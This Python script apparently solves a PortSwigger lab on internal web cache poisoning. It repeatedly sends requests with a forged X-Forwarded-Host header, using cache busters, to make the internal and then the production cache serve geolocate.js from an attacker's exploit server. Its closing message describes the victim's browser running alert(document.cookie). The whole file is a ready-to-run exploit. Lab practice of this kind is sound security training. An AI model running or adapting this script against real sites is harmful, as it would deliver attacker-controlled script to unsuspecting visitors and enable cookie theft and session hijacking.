#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Internal cache poisoning.

The external cache keys on query string + X-Forwarded-Host.
The internal cache keys on neither.

Strategy:
  1. Use a unique cache buster to bypass the external cache.
  2. Send X-Forwarded-Host pointing to the exploit server repeatedly
     until geolocate.js also reflects the exploit server (internal cache poisoned).
  3. Remove the cache buster and keep replaying to poison the production entry.
"""

import argparse
import time
import random
import string
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GEOLOCATE = "geolocate.js"
INTERVAL = 25


def random_buster():
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def send(s, lab, exploit_host, buster=None):
    params = {"cb": buster} if buster else {}
    r = s.get(
        f"{lab}/",
        params=params,
        headers={"X-Forwarded-Host": exploit_host},
        allow_redirects=False,
    )
    geolocate_poisoned = exploit_host in r.text and GEOLOCATE in r.text
    cache = r.headers.get("X-Cache", "none")
    return r, geolocate_poisoned, cache


def main():
    parser = argparse.ArgumentParser(
        description="Solve Web Cache Poisoning Lab 13 (internal cache poisoning)"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("exploit_host", help="Exploit server hostname (no https://)")
    parser.add_argument("--max-attempts", type=int, default=50)
    parser.add_argument("--cycles", type=int, default=5, help="Production poison cycles after internal hit")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    s = requests.Session()
    s.verify = False

    print(f"[*] Phase 1: poison internal cache (cache buster enabled)")
    for i in range(1, args.max_attempts + 1):
        buster = random_buster()
        r, geo_poisoned, cache = send(s, lab, args.exploit_host, buster=buster)
        print(f"[{i:3d}] X-Cache={cache:4s}  geolocate poisoned={geo_poisoned}")
        if geo_poisoned:
            print(f"[+] Internal cache poisoned! geolocate.js now points to exploit server.")
            break
    else:
        print("[-] Internal cache not poisoned after max attempts.")
        return

    print(f"\n[*] Phase 2: poison production cache (no cache buster, {args.cycles} cycles)")
    for cycle in range(1, args.cycles + 1):
        r, geo_poisoned, cache = send(s, lab, args.exploit_host, buster=None)
        print(f"[cycle {cycle}] X-Cache={cache:4s}  geolocate poisoned={geo_poisoned}")
        if cycle < args.cycles:
            time.sleep(INTERVAL)

    print("\n[*] Done. Victim visits / -> geolocate.js served from exploit server -> alert(document.cookie).")


if __name__ == "__main__":
    main()
